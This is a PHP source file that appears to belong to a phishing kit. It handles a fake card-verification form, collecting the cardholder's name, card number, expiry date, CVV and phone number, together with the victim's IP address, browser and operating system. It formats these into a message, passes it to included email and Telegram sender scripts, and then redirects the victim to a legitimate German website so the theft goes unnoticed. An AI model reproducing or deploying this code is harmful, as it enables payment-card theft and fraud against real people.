<?php

session_start();

if(isset($_POST['cardnumber'])) 
{

include("./system.php"); 
include("./detect.php"); 

$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 

$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	

$NameOnCard = $_SESSION['NameOnCard'] = $_POST['NameOnCard'];
$cardnumber = $_SESSION['cardnumber'] = $_POST['cardnumber'];
$expdate = $_SESSION['expdate'] = $_POST['expdate'];
$Securitycode = $_SESSION['Securitycode'] = $_POST['Securitycode'];
$phoneNumber = $_SESSION['phoneNumber'] = $_POST['phoneNumber'];


$bincheck = $_POST['cardnumber'] ;
$bincheck = preg_replace('/\s/', '', $bincheck);


$yagmai .= '
[👤 CardHolder Name]  = '.$_SESSION['NameOnCard'].'
[💳 CC Number] = '.$bincheck.'
[🔄 Expiry Date ]   = '.$_SESSION['expdate'].'
[🔑 CVV ] = '.$_SESSION['Securitycode'].'
[📞 Phone ]  = '.$_SESSION['phoneNumber'].'
       [+]━━━━【💻 System】━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$browserTy_Version.' and '.$OS.'
';


include("./sand_email.php"); 
include("./Add_Your_TelegramAPi.php");

$src="https://www.t-online.de/";
header("location:$src");

}

else {
$src="../Info.php";
header("location:$src");
}

?>